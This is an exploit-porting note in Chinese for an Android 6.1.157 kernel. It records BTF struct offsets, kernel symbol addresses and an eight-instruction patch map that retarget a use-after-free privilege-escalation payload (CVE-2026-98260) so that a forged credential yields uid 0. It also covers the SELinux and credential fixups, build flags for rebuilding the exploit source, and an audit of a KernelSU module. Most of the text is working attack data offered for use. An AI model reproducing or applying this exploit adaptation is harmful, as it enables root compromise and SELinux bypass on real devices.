# 6.1.157 g84 boot 对照与载荷修正

日期：2026-11-03
目标：附件 `boot.img` 的实际内核 `6.1.157-android14-11-g84ffa64b710b`

本文件只记录对这颗 boot 镜像的静态核验和资产修正。当前没有对应真机，
不能把本文结果表述为真机 root/KSU 已通过。

## 1. 输入

```text
boot.img  SHA-256 5e35c5051928bcd28a4d84e7f6538f6114b3fca21460bf2e873d412219e4aeb7
kernel    SHA-256 a3e71193f879fee06baa332483c812ae42977aa773bdff5b318b54f0a5d8b618
release   6.1.157-android14-11-g84ffa64b710b
```

boot 头为 v4，kernel 为原始 AArch64 Image，40,942,080 字节；镜像自带
kallsyms 和 BTF。`vmlinux-to-elf` 以 0xffffffc008000000 为链接基址重建出
116,738 个符号。运行载荷使用 0xffffffc080000000 作为链接基址，两者相差
0x78000000，换算时统一加这个偏移。

## 2. BTF 几何

```text
task_struct.size      0x1300
task_struct.cred      0x840
task_struct.real_cred 0x838
task_struct.comm      0x850
k_itimer.size         0x118
k_itimer.it           0x78
cred.size             0xb0
cred.uid              0x04
cred.cap_bset         0x40
cred.security         0x78
cred.user_ns          0x88
```

`__arm64_sys_getuid` 反汇编为 `ldr x8, [x8, #0x840]`，确认 uid 读取的是
`cred`，不是 `real_cred`。

## 3. 漏洞路径

`begin_new_exec` 位于 `0xffffffc00816cd40`。反汇编确认：

```text
unshare_files            0xffffffc008106878
exec_mmap down_read...   ...d250
posix_cpu_timers_exit    0xffffffc0080cd6a8   (调用点 0xffffffc00816d54c)
exit_itimers             0xffffffc0084a8b78   (调用点 0xffffffc00816d55c)
```

`posix_cpu_timers_exit` / `exit_itimers` 在可失败的 `unshare_files`、
`exec_mmap` 之后才执行，符合 CVE-2026-98260 的清理顺序。

## 4. 载荷链接常量

```text
do_timer_create    0xffffffc0084a8cd8  +0xb8  -> 0xffffffc0804a8d90  TIMER
prepare_creds      0xffffffc00804b770  +0x20  -> 0xffffffc08004b790  CRED
selinux_state      0xffffffc00a84b3a8         -> 0xffffffc08284b3a8
init_user_ns       0xffffffc00a212910         -> 0xffffffc082212910
root_user          0xffffffc00a212ba0         -> 0xffffffc082212ba0
init_groups        0xffffffc00a213ec0         -> 0xffffffc082213ec0
init_ucounts       0xffffffc00a214430         -> 0xffffffc082214430
sig_enforce        0xffffffc00a5a01a0         -> 0xffffffc0825a01a0

```

后四项是 `slide` 推导和 SELinux/凭据修复使用的链接地址。`copy_process+0x160`
是 `bl kmem_cache_alloc_node` 返回地址，和 g264 的同一取址规则一致。

## 5. 发现的载荷问题与修正

附件 boot 的 BTF 和反汇编证明 g84 的 `task_struct.cred` 是 `0x840`、
`k_itimer.size` 是 `0x118`，`do_timer_create` 中 `kmem_cache_alloc`
的返回地址是 `+0xb8`。原 `98260-g84/exploit-android-key-ptr` 的指令流和
g264 载荷逐指令比较后，大部分链接常量已经按 g84 重定位，但下面三个常量
仍是 g264 的值：

```text
TASK_CRED     0x838 -> 0x840
KITIMER_SIZE  0x108 -> 0x118
TIMER_LINK    do_timer_create+0x94 -> +0xb8
```

如果不修：

- 伪造 cred 会被写到 `task->real_cred`（0x838），而 `getuid()` 读取的是
  `task->cred`（0x840），子进程不会变成 uid 0；
- `kmem_cache_alloc` 的 trace 过滤仍按 0x108，找不到 0x118 的 timer 分配；
- trace 记录的是 `kmem_cache_alloc` 的返回地址，g84 的 timer 分配返回址是
  `do_timer_create+0xb8`，沿用 g264 的 `+0x94` 会让 `collect_nth()` 找不到
  记录。

修正采用最小指令差异，保留原载荷的预检、回收和 rootd 逻辑：

```text
输入  f529022847444b0be76b0d2f3c3a6ba1c6be23de9b5e87ec4e09f0d86ea5aaa7
输出  67359c952ce7c80e9edcb637e1f79b91f6d04d9079d5a55d4b2d9db95c5ef3d3
```

只改 8 条 AArch64 立即数：

```text
0x5a50  add x4, x10, #0x838   ->  add x4, x10, #0x840
0x45ac  cmp x15, #0x108       ->  cmp x15, #0x118
0x45b8  cmp x15, #0x108       ->  cmp x15, #0x118
0x5934  cmp x11, #0x108       ->  cmp x11, #0x118
0x5940  cmp x11, #0x108       ->  cmp x11, #0x118
0x3378  mov x2, #-0x7294      ->  mov x2, #-0x7270
0x4414  mov x8, #-0x7294      ->  mov x8, #-0x7270
0x57e4  mov x9, #-0x7294      ->  mov x9, #-0x7270
```

后三条把 `TIMER_LINK` 从 `0xffffffc0804a8d6c` 改成
`0xffffffc0804a8d90`。其余 34,160 字节保持不变。修正后读只读预检仍能
运行并正常返回 JSON。
`binary-sources/61157-g264/uaf_plant.c` 已把 `TASK_CRED` / `KITIMER_SIZE`
改成可由 `-D` 覆盖，后续从源码重建时使用
`-DTASK_CRED=0x840 -DKITIMER_SIZE=0x118`；TIMER 链接需按目标内核的
`do_timer_create` 分配返回址生成。

## 6. KSU 模块

`g264/ksm-g84-base.ko`：

```text
SHA-256 7777803ad2002752d45447f5f29d4321860925bb45b691a237d4eb5955161881
vermagic 6.1.157-android14-11-g84ffa64b710b SMP preempt mod_unload modversions aarch64
```

- 225 个 `SHN_ABS` 符号中，223 个与 g84 重建符号表逐地址一致；
  `__flush_icache_range` / `__flush_dcache_area` 不在 kallsyms 导出表中，
  且模块的 `.rela.text` / `.init.text` / `.exit.text` 没有任何重定位引用它们，
  因此这两个仅存在于符号表中的条目不会被调用。
- 与 g264 模块逐指令比较，恰好 57 处 `ldr/str` 内存偏移不同：
  `0x838→0x840`（cred，33 处）、`0x830→0x838`（real_cred，2 处）、
  `0x898→0x8a0`（sighand，11 处）、`0x900→0x908`（seccomp，2 处）、
  `0x908→0x910`（seccomp 内部字段，6 处）、`0x878→0x880`（files，3 处）。
  这些与 g84 BTF 一致，未发现残留的 g264 字段偏移。

## 7. 仍待验证

- 没有 g84 真机，未运行 98260 UAF、未加载 KSU、未做 su/LSPosed 闭环。
- `ksm-g84-base.ko` 中两个非 kallsyms 符号条目没有被任何重定位引用；
  真机 `insmod` 时仍需确认模块加载成功。
- 真机通过判据应为：预检 `verdict=ok`；`[cred] child` 返回
  `uid=0 euid=0`；`ksm-g84.ko` 的 `vermagic` 匹配；`ksud debug su` 返回
  `uid=0`；LSPosed 修复日志出现 `SOFT_REBOOT_REPAIR=ok`。

## 8. 2026-11-04 superseding payload

The 34 KiB payload and hash in §6 are historical.  g84 now uses the proven
1.0.36 static blind-reclaim payload, deterministically rebased for
`task_struct.cred=0x840` / `k_itimer.size=0x118`:

```text
sha256 6b118559a691f45d51cccb0815b623b1d03c5801df40f2beb34b995659bcc7d6
```

The BTF facts and CGA module audit above remain valid.  See
`docs/6157-SUCCESS-CHAIN-REBASE.md` for the new patch map and checks.
